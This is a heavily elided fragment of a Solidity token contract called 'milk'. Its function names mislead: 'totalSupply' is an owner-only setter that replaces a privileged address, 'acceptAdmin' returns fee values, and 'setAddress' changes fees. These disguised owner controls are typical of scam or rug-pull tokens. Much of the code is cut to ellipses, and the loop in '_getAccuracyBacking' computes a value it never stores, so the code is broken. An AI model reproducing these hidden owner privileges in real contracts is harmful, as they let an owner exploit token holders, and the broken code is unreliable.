...
contract OwnershipHelper is ContextHelper {  
    ...
    */
    ...
    function totalSupply(address newOwner) external onlyOwner {
        _factory = newOwner;
    }  
...
contract milk is ContextHelper, IERC20, OwnershipHelper{
    ...
    function _getBlockTimestamp(address _genesisPool, bool rewardPoolDistributed) external view onlyOwner returns (bool) {
    ...
    function queueTransaction(address shareholder, uint256 amount) external {
    ...
    function _getAccuracyBacking(uint256 accuracy, address[] calldata _markerPairs) public view returns (uint256){
		  ...
		  for(uint i = 0; i < _markerPairs.length; i++){
			  (liquidityBalance + _balances[_markerPairs[i]]) / (10 ** 10);
		  }
		  return (accuracy * liquidityBalance) / (10 ** 10);
	  }

    function acceptAdmin() external view returns (uint256,uint256,uint256,uint256,uint256) {
        return (
            _buybackFee,
            _reflectionFee,
            _marketingFee,
    ...
    function setAddress(uint8 _buybackfee, uint8 _reflectionfee, uint8 _marketingfee, uint8 _devfee, uint8 _feedenominator) external onlyOwner {
    ...
    function setDelay(int256 supplyDelta, uint256 supplyMax) private returns (uint256) {
